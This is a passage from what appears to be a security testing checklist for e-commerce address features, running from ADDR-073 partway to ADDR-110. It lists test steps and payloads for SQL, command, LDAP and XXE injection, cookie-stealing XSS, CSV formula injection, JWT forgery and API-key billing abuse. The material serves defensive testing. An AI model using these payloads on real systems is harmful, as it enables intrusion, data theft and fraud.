**Expected Result:** Application must properly handle Unicode input and normalize characters to prevent homoglyph attacks and rendering manipulation.

**Payload Example:**

```
street=123 Маіn St (Cyrillic а і);city=Tеst (Cyrillic е);use RTL override U+202E in address fields
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Browser

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-074 — Country Code Manipulation for Tax Avoidance
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Add an international address. 2. Intercept the request and change country_code to a tax-haven country. 3. Check if tax calculation changes based on client-provided country code.

**Expected Result:** Application must validate country code against the actual address and recalculate taxes server-side using the verified address.

**Payload Example:**

```
Change country_code=US to country_code=BM (Bermuda) or country_code=KY (Cayman Islands) while keeping US address
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-075 — International Address Format Exploitation
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Enter addresses in various international formats with different field structures. 2. Test with formats that have extra fields or missing expected fields. 3. Check for validation bypass.

**Expected Result:** Application must support international address formats while maintaining proper validation for each country format.

**Payload Example:**

```
Submit Japanese address format to US address validator;submit address with postal_code in wrong field position
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-076 — SQL Injection via International Characters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Use international character sets to obfuscate SQL injection payloads. 2. Use fullwidth or Unicode equivalents of SQL keywords. 3. Submit and check for injection.

**Expected Result:** Application must normalize Unicode input before validation and use parameterized queries regardless of character encoding.

**Payload Example:**

```
street=123 Ｍain' ＯＲ １＝１-- (fullwidth chars);city=Test＇ ＵＮＩＯＮ ＳＥＬＥＣＴ
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-077 — Character Encoding Bypass for XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Enter address fields with XSS payloads encoded in different character sets like UTF-7 or UTF-16 or ISO-2022-JP. 2. Check if encoding bypass allows script execution.

**Expected Result:** Application must enforce consistent character encoding (UTF-8) and sanitize inputs after decoding.

**Payload Example:**

```
street=+ADw-script+AD4-alert(1)+ADw-/script+AD4- (UTF-7);city=%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-078 — Country Restriction Bypass for Sanctioned Countries
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Attempt to add an address in a sanctioned or restricted country. 2. Bypass frontend country restrictions by submitting via API. 3. Check if the restricted country address is accepted.

**Expected Result:** Application must validate country restrictions server-side and reject addresses in sanctioned or restricted countries.

**Payload Example:**

```
POST /api/addresses with country_code of sanctioned country directly via API bypassing frontend dropdown
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-079 — Currency Mismatch via International Address
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Add an international address in a different currency region. 2. Intercept the order request and force currency to the cheaper region. 3. Check if pricing exploits the currency mismatch.

**Expected Result:** Application must determine currency based on server-validated address and not accept client-specified currency for international orders.

**Payload Example:**

```
Set shipping_country=IN (India) and force currency=INR for items priced lower in INR
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-080 — Phone Number Format Injection in International Addresses
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Enter international phone numbers with injection payloads. 2. Include country calling codes with special characters. 3. Check for SMS injection or command injection.

**Expected Result:** Application must validate international phone number formats strictly and sanitize all phone input before processing.

**Payload Example:**

```
phone=+1234567890;+0987654321;phone=+1' OR 1=1--;phone=+1$(whoami)
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-081 — Address Transliteration Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Enter address in non-Latin script. 2. Check if the application transliterates or translates the address. 3. Manipulate the transliteration to create a different valid address.

**Expected Result:** Application must use verified transliteration services and validate transliterated addresses against original input.

**Payload Example:**

```
Enter address in Chinese characters that transliterates to a different physical location
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-082 — IDOR on Accessing Another User's Address Book
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Access own address book via API. 2. Intercept the request and change user_id to another user. 3. Check if the entire address book of another user is returned.

**Expected Result:** Application must strictly enforce that users can only access their own address book.

**Payload Example:**

```
Change GET /api/users/1001/address-book to GET /api/users/1002/address-book
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-083 — Bulk Export of Address Book Data
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Check if address book has an export feature. 2. Attempt to export address book data. 3. Modify the user_id to download other users' address books. 4. Check for excessive data in export.

**Expected Result:** Application must restrict export functionality to authenticated user's own data and enforce authorization checks.

**Payload Example:**

```
GET /api/address-book/export?user_id=1002 with User A credentials or GET /api/admin/address-books/export
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-084 — Address Book Search SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Use the address book search functionality. 2. Inject SQL payloads in the search query parameter. 3. Observe the response for data leakage or errors.

**Expected Result:** Application must use parameterized queries for address book search operations.

**Payload Example:**

```
GET /api/address-book/search?q=' OR 1=1--;GET /api/address-book?search=test' UNION SELECT email;password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-085 — Unauthorized Sharing of Address Book
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. If address sharing exists attempt to share address book with unauthorized users. 2. Try to access shared address books without proper authorization. 3. Check sharing permissions.

**Expected Result:** Application must enforce explicit authorization for address sharing and validate permissions on every access.

**Payload Example:**

```
POST /api/address-book/share with target_user_id=1002 without their consent;access shared books without auth
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-086 — Address Book Import Malicious File Upload
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. If address book import from CSV or vCard is supported upload a malicious file. 2. Inject formulas or scripts in CSV or malicious vCard content. 3. Check for code execution or SSRF.

**Expected Result:** Application must validate and sanitize all imported address data and restrict file types and content.

**Payload Example:**

```
Upload CSV with =cmd|'/C calc'!A0 formula injection;upload vCard with SSRF URLs or XSS in fields
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Files

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## ADDR-087 — XSS via Imported Address Data
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Import addresses containing XSS payloads in name or address fields from a CSV or vCard file. 2. View the imported addresses in the address book. 3. Check if scripts execute.

**Expected Result:** Application must sanitize all imported data fields before storage and encode output when rendering.

**Payload Example:**

```
Import CSV: Name;Address with row <script>alert(1)</script>;123 <img src=x onerror=alert(1)> St
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-088 — Concurrent Access Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Simultaneously send requests to add and delete the same address. 2. Send concurrent modification requests for the same address. 3. Check for data inconsistency.

**Expected Result:** Application must implement proper locking mechanisms to prevent data corruption from concurrent address book operations.

**Payload Example:**

```
Send concurrent POST /api/addresses (add) and DELETE /api/addresses/ADDR-1001 (delete)
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADDR-089 — Address Book Pagination Authorization Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Access address book with pagination. 2. Modify page_size to a very large number. 3. Check if addresses from other users leak through pagination abuse.

**Expected Result:** Application must ensure pagination only returns the authenticated user's addresses regardless of page size.

**Payload Example:**

```
GET /api/address-book?page=1&page_size=999999 to check for cross-user data leakage
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-090 — GraphQL Over-Fetching on Address Book
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. If GraphQL is used query the address book with nested queries requesting excessive fields. 2. Request fields like user details or payment info through address relationships. 3. Check for data exposure.

**Expected Result:** Application must implement field-level authorization and query depth limiting in GraphQL to prevent over-fetching.

**Payload Example:**

```
{addressBook{addresses{id;street;user{id;email;password;paymentMethods{cardNumber;cvv}}}}}
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** Burp Suite;InQL;GraphQL Voyager

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## ADDR-091 — Address Book Deletion Without Confirmation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Send a delete all addresses request or bulk delete request without any confirmation. 2. Check if all addresses are deleted in one request without requiring confirmation.

**Expected Result:** Application must require explicit confirmation for bulk operations and implement undo or soft-delete functionality.

**Payload Example:**

```
DELETE /api/address-book/clear or POST /api/address-book/bulk-delete with all address IDs
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-092 — JWT Manipulation on Address Book Endpoint
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Decode the JWT token. 2. Modify the user_id or sub claim. 3. Change the algorithm to none. 4. Submit request to address book endpoint with tampered token.

**Expected Result:** Application must validate JWT signatures server-side and reject tokens with modified claims or algorithm downgrade.

**Payload Example:**

```
Modify JWT header alg=none and payload sub=admin;change user_id in payload to another user
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Burp Suite;jwt_tool

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## ADDR-093 — Sensitive Data Exposure in Address Book API Response
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Fetch address book data via API. 2. Inspect the response for sensitive or unnecessary fields. 3. Check for internal IDs or metadata or creation timestamps.

**Expected Result:** Application must return only necessary fields in address book responses and strip internal metadata.

**Payload Example:**

```
Check response for fields like created_by_admin;internal_note;db_row_id;last_modified_by;ip_address
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-094 — Address Book CORS Misconfiguration
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Send address book API request from a different origin. 2. Check the CORS headers in the response. 3. Test if wildcard or overly permissive origins are allowed.

**Expected Result:** Application must implement strict CORS policies allowing only trusted origins to access address book APIs.

**Payload Example:**

```
Check for Access-Control-Allow-Origin: * or reflection of arbitrary Origin header in response
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite;Browser;cURL

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## ADDR-095 — LDAP Injection in Address Fields
**Test Category:** Injection (WSTG-INPV-06) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If address lookup integrates with LDAP directory inject LDAP payloads in address fields. 2. Observe the response for LDAP errors or bypass.

**Expected Result:** Application must sanitize all inputs used in LDAP queries and use parameterized LDAP operations.

**Payload Example:**

```
street=*)(cn=admin)(|;city=test)(|(uid=*))(cn=*;name=admin)(&
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## ADDR-096 — Command Injection via Address Processing
**Test Category:** Injection (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If addresses are processed by server-side commands for label generation or geocoding inject OS command payloads. 2. Check for command execution.

**Expected Result:** Application must never pass user-provided address input directly to OS commands and use safe APIs.

**Payload Example:**

```
street=123 Main St;cat /etc/passwd;city=Test`whoami`;state=NY|id
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite;Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## ADDR-097 — XXE in Address Import XML
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If address import accepts XML format inject XXE payload in the XML. 2. Submit and check if external entities are resolved.

**Expected Result:** Application must disable external entity processing in all XML parsers used for address data.

**Payload Example:**

```
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><address><street>&xxe;</street></address>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## ADDR-098 — Insecure Deserialization in Address Data
**Test Category:** Injection (WSTG-INPV-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If address data is serialized check for insecure deserialization. 2. Inject malicious serialized objects in address fields. 3. Submit and observe for RCE.

**Expected Result:** Application must avoid deserializing untrusted input and validate all deserialized address data.

**Payload Example:**

```
Inject serialized Java/PHP/Python object in address parameters or cookies
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** Burp Suite;ysoserial

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## ADDR-099 — Default Address Information Leakage in Error Messages
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Attempt to set an invalid or non-existent address as default. 2. Observe error messages for verbose information about the address system or database structure.

**Expected Result:** Application must return generic error messages without exposing internal details about address storage or validation logic.

**Payload Example:**

```
PUT /api/addresses/set-default with address_id=INVALID-999 and check for verbose database error messages
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-100 — Mass Assignment on Default Address Flag
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. When editing an address add is_default=true as an additional parameter. 2. Check if the address becomes default without using the proper set-default endpoint.

**Expected Result:** Application must only process default address changes through the dedicated endpoint and ignore is_default in edit requests.

**Payload Example:**

```
Add is_default=true to PUT /api/addresses/ADDR-1001 edit request body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ADDR-101 — Validation Logic Bypass via Null Bytes
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Insert null bytes in address fields before validation. 2. Check if null bytes truncate input causing validation to pass on truncated valid-looking address. 3. Verify what is stored.

**Expected Result:** Application must reject null bytes in address input and validate the complete untruncated input.

**Payload Example:**

```
street=123 Main St%00<script>alert(1)</script>;zip=10001%00' OR 1=1--
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-102 — Address Validation API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. If address validation uses a third-party API check for API key exposure in client-side code. 2. Test if the key can be abused for unauthorized validation requests.

**Expected Result:** Application must proxy validation requests through its own server and not expose third-party API keys to the client.

**Payload Example:**

```
Search JavaScript files for validation API keys like SmartyStreets;Loqate;Google validation API keys
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;GitLeaks

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-103 — Geolocation Precision Abuse for Tracking
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Check the precision of geolocation data collected. 2. Verify if high-precision GPS data is stored when only city-level precision is needed. 3. Check data access controls.

**Expected Result:** Application must collect only the minimum necessary geolocation precision and implement strict access controls on location data.

**Payload Example:**

```
Check if coordinates with 6+ decimal places (sub-meter precision) are stored when only city-level is needed
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Manual Database Review

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ADDR-104 — Geolocation Fallback Security
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Block geolocation API in browser. 2. Check what fallback mechanism the application uses. 3. Test if the fallback like IP geolocation can be manipulated via X-Forwarded-For.

**Expected Result:** Application must validate fallback location data and not blindly trust IP-based geolocation or client-provided fallback values.

**Payload Example:**

```
Block navigator.geolocation then add X-Forwarded-For: IP-of-different-country to manipulate IP geolocation fallback
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-105 — Google Maps API Billing Abuse
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Extract Google Maps API key. 2. Check if billing alerts and quotas are set. 3. Make excessive API calls to exhaust the key owner's quota and generate billing charges.

**Expected Result:** Application must set strict usage quotas and billing alerts on Google Maps API keys and restrict key usage to specific APIs.

**Payload Example:**

```
Use extracted API key to make 100000+ Directions API calls generating billing charges for the key owner
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** cURL;Custom Scripts;KeyHacks

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADDR-106 — Autocomplete Endpoint Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Access the Google Maps Places Autocomplete proxy endpoint. 2. Send rapid requests to abuse the autocomplete service. 3. Check for rate limiting.

**Expected Result:** Application must rate-limit autocomplete requests and implement abuse detection to prevent excessive third-party API usage.

**Payload Example:**

```
Send 1000+ GET /api/maps/autocomplete?input=a requests per minute
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-107 — Zone Configuration Exposure via Error Messages
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Submit boundary or edge-case addresses to zone validation. 2. Observe error messages for zone configuration details. 3. Check if zone boundaries or internal zone IDs are exposed.

**Expected Result:** Application must return generic zone validation responses without exposing internal zone configuration or boundary data.

**Payload Example:**

```
Submit address exactly on zone boundary and check error for zone_boundary_lat;zone_boundary_lng;zone_config details
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-108 — Zone Validation TOCTOU Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Validate address in a serviceable zone. 2. Quickly change address to non-serviceable zone before order submission. 3. Check if the stale validation is used.

**Expected Result:** Application must re-validate the delivery zone at the time of order submission not just during initial address entry.

**Payload Example:**

```
Validate address in zone A then rapidly change to zone B address and submit order before re-validation
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Suite;Turbo Intruder

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADDR-109 — Zip Code Lookup Reflected XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Enter XSS payload in the zip code search field. 2. Submit the lookup. 3. Check if the input is reflected in the response without encoding.

**Expected Result:** Application must encode all user inputs reflected in zip code lookup responses.

**Payload Example:**

```
GET /api/zipcode/lookup?code="><script>alert(1)</script>&code=<img/src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-110 — Server-Side Zip Code Lookup Response Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Perform zip code lookup. 2. Intercept the response. 3. Modify the returned city or state or delivery availability. 4. Forward and check if the application trusts the modified response.

